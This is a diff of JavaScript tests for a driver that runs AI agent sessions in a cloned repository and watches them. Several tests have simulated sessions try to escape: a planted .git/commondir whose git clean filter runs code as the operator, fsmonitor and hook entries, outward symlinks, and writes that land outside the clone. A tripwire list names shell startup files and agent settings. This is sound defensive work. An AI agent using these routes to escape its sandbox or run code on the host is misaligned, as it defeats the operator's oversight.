+    rmrf(d0.base);
+  }
+});
+
+it('T19 outside: a Sentinel row in a watched folder outside the clone halts the run, unless another session explains it', async () => {
+  const d0 = driverSetup([], {});
+  const live = path.join(d0.base, 'live');
+  fs.mkdirSync(live);
+  const hit = path.join(live, 'src', 'a.js');
+  const sentinelRow = { session_id: null, source: 'fs-sentinel', type: 'file_write', path: hit };
+  const d = driverSetup([{ appendLog: [sentinelRow], result: R('nothing', null) }, { result: R('nothing', null) }], { slices: [], outsideRoots: [live] });
+  const ok = driverSetup([{ appendLog: [{ session_id: 'peer-2', type: 'command_run', command: 'npm test', dt: 500 }, sentinelRow], result: R('nothing', null) }], { slices: [], outsideRoots: [live], maxSessions: 1 });
+  try {
+    await expectHalt(d, await turbo.run(d.opts), 'outside', hit);
+    const out = await turbo.run(ok.opts);
+    assert.strictEqual(out.stopReason, 'max-sessions', JSON.stringify(out.sessions[0].checks));
+    assert.deepStrictEqual(out.sessions[0].checks.outside, { roots: 1, rows: 1, explained: 1 });
+  } finally {
+    rmrf(d.base);
+    rmrf(ok.base);
+    rmrf(d0.base);
+  }
+});
+
+/**
+ * Cold verify 5's route: a session points .git/commondir at a git dir whose config defines a clean
+ * filter that runs code, adds a .gitattributes using it and leaves a tracked file modified. The
+ * next unsandboxed git that hashes that file (the driver's git status) runs the filter as O.
+ */
+function plantCommondir(d) {
+  const evil = path.join(d.base, 'evilgit');
+  const marker = path.join(d.base, 'RAN-AS-O');
+  const step = {
+    copyDirs: [[path.join(d.root, '.git'), evil]],
+    appendFiles: { [path.join(evil, 'config')]: `[filter "evil"]\n\tclean = touch ${marker}; cat\n` },
+    // Same size as 'x\n': a size change lets git call the file modified without hashing it, and
+    // the filter would not run (measured on git 2.50.1 in the scratchpad: 'y\n' ran it, 'changed\n' did not).
+    writeFiles: { [path.join(d.root, '.git', 'commondir')]: `${evil}\n`, [path.join(d.root, '.gitattributes')]: 'tracked.txt filter=evil\n', [path.join(d.root, 'tracked.txt')]: 'y\n' },
+    result: R('done', 'a'),
+  };
+  return { step, marker };
+}
+
+it('T20 .git: a planted commondir halts the run before any git of the driver\'s runs its code (cold verify 5)', async () => {
+  const d = driverSetup([], { slices: [S('a')] });
+  try {
+    const { step, marker } = plantCommondir(d);
+    fs.writeFileSync(d.opts.env.TURBO_FAKE, JSON.stringify([step, { result: R('nothing', null) }]));
+    const out = await turbo.run(d.opts);
+    await pause(300);
+    assert.ok(!fs.existsSync(marker), 'the driver ran git over the planted .git: the filter ran as O');
+    await expectHalt(d, out, 'git', 'commondir');
+    assert.ok(!fs.existsSync(marker), 'a later run ran git over the planted .git');
+  } finally {
+    rmrf(d.base);
+  }
+});
+
+it('T20 .git: a gitfile in place of .git, a config key, or a hook halts the run', async () => {
+  const cases = [
+    (d) => ({ renames: [[path.join(d.root, '.git'), path.join(d.base, 'moved-git')]], writeFiles: { [path.join(d.root, '.git')]: `gitdir: ${path.join(d.base, 'moved-git')}\n` }, needle: 'is a file' }),
+    (d) => ({ appendFiles: { [path.join(d.root, '.git', 'config')]: '[core]\n\tfsmonitor = /tmp/x\n' }, needle: 'core.fsmonitor' }),
+    (d) => ({ writeFiles: { [path.join(d.root, '.git', 'hooks', 'post-commit')]: '#!/bin/sh\ntouch /tmp/x\n' }, needle: 'post-commit' }),
+  ];
+  for (const make of cases) {
+    const d = driverSetup([], { slices: [S('a')] });
+    try {
+      const { needle, ...step } = make(d);
+      fs.writeFileSync(d.opts.env.TURBO_FAKE, JSON.stringify([{ ...step, result: R('done', 'a') }, { result: R('nothing', null) }]));
+      await expectHalt(d, await turbo.run(d.opts), 'git', needle);
+    } finally {
+      rmrf(d.base);
+    }
+  }
+});
+
+it('T20 .git: a clean TURBO clone passes; its config is read without git', () => {
+  const base = fs.realpathSync(tmpDir());
+  try {
+    const src = path.join(base, 'src');
+    fs.mkdirSync(src);
+    gitIn(src, ['init', '-q', '-b', 'work']);
+    fs.writeFileSync(path.join(src, 'f.txt'), 'f\n');
+    gitIn(src, ['add', 'f.txt']);
+    gitIn(src, ['commit', '-q', '-m', 'base']);
+    gitIn(src, ['branch', 'output-1']);
+    const dest = path.join(base, 'clone');
+    turbo.cloneRepo({ source: src, dest, branch: 'work', claudeHome: path.join(base, 'ch') });
+    const g = watch.gitSetup(dest);
+    assert.deepStrictEqual(g.findings, [], 'a clone cloneRepo made fails its own check');
+    assert.strictEqual(g.source, fs.realpathSync(src));
+    assert.ok(g.digest, 'no digest of config, hooks and info');
+  } finally {
+    rmrf(base);
+  }
+});
+
+it('T20 links: a link in the clone to outside it halts the run; the links the clone is made with pass', async () => {
+  const d = driverSetup([], { slices: [S('a')] });
+  try {
+    const out = path.join(d.base, 'outside-target');
+    fs.mkdirSync(out);
+    fs.writeFileSync(d.opts.env.TURBO_FAKE, JSON.stringify([{ links: { [path.join(d.root, 'swap')]: out }, result: R('done', 'a') }, { result: R('nothing', null) }]));
+    await expectHalt(d, await turbo.run(d.opts), 'links', 'swap');
+  } finally {
+    rmrf(d.base);
+  }
+  const base = fs.realpathSync(tmpDir());
+  try {
+    const root = path.join(base, 'clone');
+    fs.mkdirSync(path.join(root, 'docs'), { recursive: true });
+    fs.mkdirSync(path.join(base, 'nm'));
+    fs.symlinkSync(path.join(base, 'nm'), path.join(root, 'node_modules'));
+    fs.symlinkSync(path.join(base, 'rules.md'), path.join(root, 'CLAUDE.md'));
+    fs.symlinkSync('inside.txt', path.join(root, 'docs', 'near'));
+    const allowed = { node_modules: path.join(base, 'nm'), 'CLAUDE.md': path.join(base, 'rules.md') };
+    assert.deepStrictEqual(watch.linkScan(root, allowed).findings, []);
+    fs.unlinkSync(path.join(root, 'CLAUDE.md'));
+    fs.symlinkSync(path.join(base, 'elsewhere'), path.join(root, 'CLAUDE.md'));
+    assert.strictEqual(watch.linkScan(root, allowed).findings.length, 1, 'a made link pointed somewhere new passed');
+  } finally {
+    rmrf(base);
+  }
+});
+
+it('T20 driver: refuses to start over a planted .git or an outside link, and runs its own git with the git dir pinned', async () => {
+  const d = driverSetup([{ result: R('nothing', null) }], { slices: [] });
+  try {
+    fs.writeFileSync(path.join(d.root, '.git', 'commondir'), `${d.base}\n`);
+    await assert.rejects(() => turbo.run(d.opts), /commondir/);
+    fs.unlinkSync(path.join(d.root, '.git', 'commondir'));
+    fs.symlinkSync(d.base, path.join(d.root, 'up'));
+    await assert.rejects(() => turbo.run(d.opts), /up is a link/);
+    assert.ok(!d.called(0), 'a session ran');
+  } finally {
+    rmrf(d.base);
+  }
+  const e = turbo.pinnedGitEnv('/c', { PATH: '/bin', GIT_DIR: '/evil', GIT_CONFIG_GLOBAL: '/x' });
+  assert.deepStrictEqual([e.GIT_DIR, e.GIT_COMMON_DIR, e.GIT_WORK_TREE, e.GIT_CONFIG_NOSYSTEM, e.GIT_CONFIG_GLOBAL, e.PATH], ['/c/.git', '/c/.git', '/c', '1', undefined, '/bin']);
+  const pairs = Object.fromEntries([0, 1].map((i) => [e[`GIT_CONFIG_KEY_${i}`], e[`GIT_CONFIG_VALUE_${i}`]]));
+  assert.deepStrictEqual(pairs, { 'core.hooksPath': '/dev/null', 'core.fsmonitor': 'false' });
+});
+
+it('T19 tripwire: the default list names the files that run code as O, and none of the clone', () => {
+  const home = '/U/o';
+  const list = watch.tripwirePaths({ home, live: '/U/o/tools/orunmila', claudeProjects: [] });
+  const has = (p) => list.some((e) => (typeof e === 'string' ? e : e.json) === p);
+  for (const p of ['.zshrc', '.zprofile', '.bashrc', '.gitconfig', '.claude/settings.json', '.claude/skills', 'Library/LaunchAgents', '.claude.json', 'tools/orunmila/.git/config', 'tools/orunmila/.git/hooks'])
+    assert.ok(has(path.join(home, p)), `the tripwire does not cover ${p}`);
+  assert.ok(!has(path.join(home, '.claude', 'plugins')), 'Claude Code rewrites plugins/ itself: it would halt every run');
+});
+
+
+const glove = (p, diff = '--- a\n+++ b\n@@ -0,0 +1 @@\n+x') => ({ session_id: '$SELF', type: 'file_write', source: 'hook', path: p, diff });
+const disk = (p) => ({ session_id: null, type: 'file_write', source: 'fs-sentinel', path: p });
+
+it('T21 join: a Glove write with no Sentinel row on the clone halts the run (the write landed elsewhere)', async () => {
+  const d = driverSetup([], { slices: [S('a')], join: true });
+  try {
+    const raced = path.join(d.root, 'src', 'raced.js');
+    fs.writeFileSync(d.opts.env.TURBO_FAKE, JSON.stringify([{ writeFiles: { [path.join(d.base, 'elsewhere', 'raced.js')]: 'x\n' }, appendLog: [glove(raced)], result: R('done', 'a') }, { result: R('nothing', null) }]));
+    const out = await turbo.run(d.opts);
+    await expectHalt(d, out, 'join', raced);
+    assert.ok(fs.readFileSync(path.join(out.runDir, 'summary.md'), 'utf8').includes('Every write in the run is in both records: **refuted**'));
+  } finally {
+    rmrf(d.base);
+  }
+});
+
+it('T21 join: a Glove write outside the clone and TURBO_HOME halts the run', async () => {
+  const d = driverSetup([], { slices: [S('a')], join: true });
+  try {
+    const away = path.join(d.base, 'away.txt');
+    fs.writeFileSync(d.opts.env.TURBO_FAKE, JSON.stringify([{ appendLog: [glove(away)], result: R('done', 'a') }, { result: R('nothing', null) }]));
+    await expectHalt(d, await turbo.run(d.opts), 'join', 'outside the clone');
+  } finally {
+    rmrf(d.base);
+  }
+});
+
+it('T21 join: paired writes and a write that changed nothing pass; the declarations say confirmed, with counts', async () => {
+  const d = driverSetup([], { slices: [], join: true, maxSessions: 1 });
+  try {
+    const a = path.join(d.root, 'a.txt');
+    const same = path.join(d.root, 'same.txt');
+    fs.writeFileSync(d.opts.env.TURBO_FAKE, JSON.stringify([{ appendLog: [glove(a), disk(a), glove(same, '')], result: R('nothing', null) }]));
+    const out = await turbo.run(d.opts);
+    assert.strictEqual(out.stopReason, 'max-sessions', JSON.stringify(out.sessions[0].findings));
+    assert.deepStrictEqual(out.sessions[0].checks.join, { writes: 2, paired: 1, unchanged: 1 });
+    const summary = fs.readFileSync(path.join(out.runDir, 'summary.md'), 'utf8');
+    for (const line of ['Every write in the run is in both records: **confirmed**', "The clone's .git held in every session: **confirmed**", 'No link in the clone points outside it, except the ones it was made with: **confirmed**'])
+      assert.ok(summary.includes(line), `the summary lacks: ${line}\n${summary}`);
+    // No outside root and no Sentinel in this test: that declaration cannot be confirmed.
+    assert.ok(summary.includes('No file outside the clone was written in the run: **unproven**'), summary);
+  } finally {
+    rmrf(d.base);
+  }
+});
+
+it('T21 declarations: with no Sentinel on the clone, "every write is in both records" is unproven, never confirmed', async () => {
+  const d = driverSetup([{ result: R('nothing', null) }], { slices: [], maxSessions: 1 });
+  try {
+    const out = await turbo.run(d.opts);
+    const summary = fs.readFileSync(path.join(out.runDir, 'summary.md'), 'utf8');
+    assert.ok(summary.includes('Every write in the run is in both records: **unproven**'), summary);
+  } finally {
+    rmrf(d.base);
+  }
+});
+
+it('T21 end to end, with real Sentinels: a write whose Glove row names the clone but which lands elsewhere halts the run; honest writes pass', async () => {
+  const run1 = async (raced) => {
+    const d = driverSetup([], { slices: [S('a')], sentinel: true, sentinelBin: ORUNMILA_BIN, settleMs: 1500, maxSessions: 1 });
+    const honest = path.join(d.root, 'src', 'honest.js');
+    const named = path.join(d.root, 'src', 'raced.js');
+    const steps = [
+      {
+        writeFiles: { [honest]: 'honest\n', ...(raced ? { [path.join(d.base, 'elsewhere', 'raced.js')]: 'raced\n' } : {}) },
+        appendLog: [glove(honest), ...(raced ? [glove(named)] : [])],
+        result: R('done', 'a'),
+      },
+      { result: R('nothing', null) },
+    ];
+    fs.writeFileSync(d.opts.env.TURBO_FAKE, JSON.stringify(steps));
+    return { d, out: await turbo.run(d.opts), honest, named };
+  };
+  const clean = await run1(false);
+  try {
+    assert.strictEqual(clean.out.stopReason, 'max-sessions', JSON.stringify(clean.out.sessions[0].findings));
+    assert.deepStrictEqual(clean.out.sessions[0].checks.join, { writes: 1, paired: 1, unchanged: 0 });
+  } finally {
+    rmrf(clean.d.base);
+  }
+  const bad = await run1(true);
+  try {
+    await expectHalt(bad.d, bad.out, 'join', bad.named);
+    const halt = JSON.parse(fs.readFileSync(path.join(bad.d.home, 'driver', 'HALT.json'), 'utf8'));
+    assert.ok(!halt.findings.some((f) => f.detail.includes(bad.honest)), 'the honest write, which the Sentinel saw, was a finding');
+  } finally {
+    rmrf(bad.d.base);
+  }
+});
+
+runAll('turbo');
